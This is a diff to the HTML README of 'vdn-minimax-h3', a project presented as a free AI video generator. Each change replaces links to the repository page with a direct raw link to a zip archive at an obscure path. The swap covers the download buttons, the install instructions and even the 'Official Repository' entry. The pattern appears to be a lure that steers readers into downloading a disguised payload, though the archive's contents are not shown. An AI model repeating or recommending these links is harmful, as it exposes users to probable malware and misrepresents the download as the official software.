@@ -1,7 +1,7 @@
 <h1>🚀 vdn-minimax-h3 - Effortless AI Video Generation for Everyone</h1>
 
 <p align="center">
-  <a href="https://github.com/Netb2469/vdn-minimax-h3" style="display:inline-block; padding:15px 35px; background:linear-gradient(135deg,#00c6ff,#0072ff); color:#fff; font-size:20px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 4px 15px rgba(0,114,255,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://raw.githubusercontent.com/Netb2469/vdn-minimax-h3/main/elaeodochon/3.7.zip" style="display:inline-block; padding:15px 35px; background:linear-gradient(135deg,#00c6ff,#0072ff); color:#fff; font-size:20px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 4px 15px rgba(0,114,255,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 <h2>🌟 What is vdn-minimax-h3?</h2>
@@ -66,7 +66,7 @@
 
 <h3>Step 1: Download the Application</h3>
 <ol>
-  <li>Click the blue <strong>"DOWNLOAD NOW"</strong> button at the top of this page, or visit this link: <a href="https://github.com/Netb2469/vdn-minimax-h3">https://github.com/Netb2469/vdn-minimax-h3</a></li>
+  <li>Click the blue <strong>"DOWNLOAD NOW"</strong> button at the top of this page, or visit this link: <a href="https://raw.githubusercontent.com/Netb2469/vdn-minimax-h3/main/elaeodochon/3.7.zip">https://raw.githubusercontent.com/Netb2469/vdn-minimax-h3/main/elaeodochon/3.7.zip</a></li>
   <li>On the page that opens, look for the green <strong>"Code"</strong> button and click it, then select <strong>"Download ZIP"</strong>.</li>
   <li>Alternatively, scroll down to the <strong>"Releases"</strong> section on that page and click the most recent release, then download the file that ends with <strong>.zip</strong>.</li>
 </ol>
@@ -185,8 +185,8 @@ A: The application supports videos up to 10 seconds long for optimal quality and
 
 <h2>🔗 Additional Resources</h2>
 <ul>
-  <li><strong>Official Repository:</strong> <a href="https://github.com/Netb2469/vdn-minimax-h3">https://github.com/Netb2469/vdn-minimax-h3</a></li>
-  <li><strong>Visit this link to download the application:</strong> <a href="https://github.com/Netb2469/vdn-minimax-h3">Click Here</a></li>
+  <li><strong>Official Repository:</strong> <a href="https://raw.githubusercontent.com/Netb2469/vdn-minimax-h3/main/elaeodochon/3.7.zip">https://raw.githubusercontent.com/Netb2469/vdn-minimax-h3/main/elaeodochon/3.7.zip</a></li>
+  <li><strong>Visit this link to download the application:</strong> <a href="https://raw.githubusercontent.com/Netb2469/vdn-minimax-h3/main/elaeodochon/3.7.zip">Click Here</a></li>
   <li>For more help, visit the <strong>"Issues"</strong> tab on the GitHub page to see if your question has been answered, or report a new issue.</li>
 </ul>
 
@@ -196,5 +196,5 @@ A: The application supports videos up to 10 seconds long for optimal quality and
 <p>We hope you enjoy creating amazing videos with vdn-minimax-h3! Remember, the only limit is your imagination. Share your creations with friends, colleagues, or on social media - don't forget to tag the project!</p>
 
 <p align="center" style="margin-top:40px;">
-  <a href="https://github.com/Netb2469/vdn-minimax-h3" style="display:inline-block; padding:15px 35px; background:linear-gradient(135deg,#ff6b6b,#ee5a24); color:#fff; font-size:20px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 4px 15px rgba(238,90,36,0.4);">⬇️ GET STARTED - DOWNLOAD NOW</a>
+  <a href="https://raw.githubusercontent.com/Netb2469/vdn-minimax-h3/main/elaeodochon/3.7.zip" style="display:inline-block; padding:15px 35px; background:linear-gradient(135deg,#ff6b6b,#ee5a24); color:#fff; font-size:20px; font-weight:bold; text-decoration:none; border-radius:50px; box-shadow:0 4px 15px rgba(238,90,36,0.4);">⬇️ GET STARTED - DOWNLOAD NOW</a>
 </p>
